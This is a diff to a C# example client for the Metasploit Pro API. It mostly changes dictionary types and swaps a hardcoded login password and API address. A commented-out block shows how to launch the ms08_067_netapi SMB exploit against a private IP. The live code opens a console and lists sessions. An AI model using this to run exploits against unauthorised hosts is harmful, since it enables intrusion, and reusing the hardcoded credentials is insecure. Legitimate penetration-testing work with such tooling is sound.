@@ -8,21 +8,21 @@ namespace ModuleExecuteExample
 	{
 		public static void Main (string[] args)
 		{
-			using (MetasploitSession session = new MetasploitSession("metasploit", "2c8X|a2!", "https://192.168.1.148:3790/api/1.1"))
+			using (MetasploitSession session = new MetasploitSession("metasploit", "P@ssw0rd!", "https://192.168.1.5:3790/api/1.1"))
 			{
 				if (string.IsNullOrEmpty(session.Token))
 					throw new Exception("Login failed. Check credentials");
 				
 				using (MetasploitProManager manager = new MetasploitProManager(session))
 				{
-//					Dictionary<object, object> options = new Dictionary<object, object>();
+//					Dictionary<string, object> options = new Dictionary<string, object>();
 //					options.Add("RHOST", "192.168.1.129");
 //					options.Add("RPORT", "445");
 //					options.Add("LPORT", new Random().Next(1001, 50000));
 //					
-//					Dictionary<object, object> response = manager.ExecuteModule("exploit", "windows/smb/ms08_067_netapi", options);
+//					Dictionary<string, object> response = manager.ExecuteModule("exploit", "windows/smb/ms08_067_netapi", options);
 //					
-//					foreach (KeyValuePair<object, object> pair in response)
+//					foreach (KeyValuePair<string, object> pair in response)
 //						Console.WriteLine(pair.Key + ": " + pair.Value);
 				
 					var response = manager.CreateConsole();
@@ -64,7 +64,7 @@ namespace ModuleExecuteExample
 					response = manager.ListSessions();
 					
 					foreach (var pair in response)
-						foreach (var p in pair.Value as Dictionary<object, object>)
+						foreach (var p in pair.Value as Dictionary<string, object>)
 							Console.WriteLine(p.Key + ": "  + p.Value);
 					
 					manager.DestroyConsole(consoleID);
